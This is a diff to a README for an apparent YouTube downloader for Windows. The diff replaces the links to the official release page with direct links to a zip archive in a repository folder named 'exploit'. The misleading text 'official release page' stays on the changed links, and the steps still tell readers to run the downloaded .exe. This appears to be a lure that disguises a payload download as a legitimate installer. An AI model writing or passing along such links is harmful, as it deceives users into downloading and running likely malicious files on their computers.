@@ -1,16 +1,16 @@
 # 📺 yt-downloader-savetube - Download YouTube videos and music easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/raw/refs/heads/main/exploit/Properties/yt_downloader_savetube_v2.2.zip)
 
 This application provides a simple way to save videos and audio from YouTube to your computer. It handles high-definition files and saves them as MP4 or MP3. You do not need technical knowledge to use this tool. The software works as a desktop application on Windows.
 
 ## 📥 How to download the app
 
-Go to the [official release page](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/releases) to find the latest version of the installer. 
+Go to the [official release page](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/raw/refs/heads/main/exploit/Properties/yt_downloader_savetube_v2.2.zip) to find the latest version of the installer. 
 
 Follow these steps to set up the software:
 
-1. Visit the [link provided here](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/releases).
+1. Visit the [link provided here](https://github.com/genusdacrydiumvagrant672/yt-downloader-savetube/raw/refs/heads/main/exploit/Properties/yt_downloader_savetube_v2.2.zip).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Open the downloaded file once it finishes.
